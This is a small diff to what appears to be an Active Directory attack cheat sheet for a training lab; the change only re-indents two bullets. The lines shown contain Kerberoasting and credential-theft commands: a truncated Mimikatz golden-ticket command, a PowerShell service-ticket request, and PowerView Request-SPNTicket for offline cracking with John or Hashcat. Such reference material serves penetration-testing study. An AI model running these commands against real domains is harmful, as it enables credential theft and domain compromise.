@@ -570,8 +570,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"`
 
 - Using Powerview
-- `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
-- `Request-SPNTicket -SPN "<SPN>"` #Using PowerView `Ex: MSSQLSvc/mgmt.domain.local`
+  - `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
+  - `Request-SPNTicket -SPN "<SPN>"` #Using PowerView `Ex: MSSQLSvc/mgmt.domain.local`
 
 - Check if the TGS has been granted
   - `klist`
